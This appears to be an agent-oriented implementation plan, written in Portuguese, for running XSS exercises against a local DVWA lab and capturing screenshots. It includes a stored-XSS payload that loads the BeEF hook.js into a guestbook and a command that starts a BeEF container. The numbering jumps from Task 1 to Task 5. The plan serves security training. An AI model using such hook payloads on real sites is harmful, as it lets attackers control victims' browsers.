# Guia de Execução XSS DVWA - Plano de Implementação

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Executar os 9 cenários de XSS do DVWA + o cenário BeEF usando o MCP do Chrome e tirar prints salvando-os em `C:\www\DVWA\prints`.

**Architecture:** Iniciar o Chrome, fazer login no DVWA, configurar o banco, criar pasta de prints, mockar `window.alert` para exibição visual nos prints, e seguir sequencialmente cada cenário do guia, salvando as evidências.

**Tech Stack:** Chrome (Puppeteer/DevTools MCP), Docker, PowerShell.

---

### Task 1: Preparação do Ambiente e Login

**Files:**
- Create: `C:\www\DVWA\docs\superpowers\plans\2026-06-16-dvwa-xss.md` (Este plano)

- [ ] **Step 1: Criar diretório de prints**
  Run: `New-Item -ItemType Directory -Path C:\www\DVWA\prints -Force` in PowerShell.
  Expected: Diretório criado com sucesso.

- [ ] **Step 2: Iniciar página no Chrome e acessar setup**
  Use `new_page` do MCP para abrir `http://localhost:4280/setup.php`.
  Expected: Página de Setup do DVWA carregada.

- [ ] **Step 3: Resetar Banco de Dados**
  Use `click` ou `evaluate_script` para clicar em "Create / Reset Database".
  Expected: Redirecionamento para a tela de login.

- [ ] **Step 4: Realizar Login**
  Preencher usuário `admin` e senha `password`, clicar no botão Login.
  Expected: Logado com sucesso, redirecionado para a página inicial do DVWA.

- [ ] **Step 5: Injetar script auxiliar de Alerta Visual**
  Injetar no console um script que substitui `window.alert` por um popup em HTML/CSS para que apareça de forma bonita nas capturas de tela.
  Code snippet:
  ```javascript
  window.alert = function(msg) {
    const el = document.getElementById('custom-xss-alert') || document.createElement('div');
    el.id = 'custom-xss-alert';
    el.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#ff3333;color:white;padding:15px 30px;font-size:18px;font-weight:bold;border:3px solid white;border-radius:10px;z-index:999999;box-shadow:0 0 15px rgba(0,0,0,0.5);text-align:center;';
    el.innerHTML = '🔥 XSS DISPARADO! 🔥<br/><span style="font-size:14px;font-weight:normal;">' + msg + '</span>';
    document.body.appendChild(el);
  };
  ```

### Task 5: Cenário BeEF (Seção 7)

- [ ] **Step 1: Executar container BeEF**
  Iniciar o container Docker oficial do BeEF no background:
  `docker run -d --name beef-xss -p 3000:3000 -p 6789:6789 beefproject/beef`
  Esperar alguns segundos para inicialização.

- [ ] **Step 2: Configurar e injetar hook no DVWA**
  1. Alterar segurança para Low.
  2. Navegar para `http://localhost:4280/vulnerabilities/xss_s/`.
  3. Injetar o script do BeEF na mensagem: `<script src="http://localhost:3000/hook.js"></script>`.
  4. Clicar em "Sign Guestbook".

- [ ] **Step 3: Acessar painel do BeEF e capturar evidência**
  1. Abrir nova aba/página em `http://localhost:3000/ui/panel`.
  2. Credenciais padrão BeEF (usuário: `beef`, senha: ver logs/gerada ou configurar no container, ou usar imagem sem autenticação pesada).
  3. Tirar print do painel mostrando o browser hooked em `C:\www\DVWA\prints\print_beef.png`.
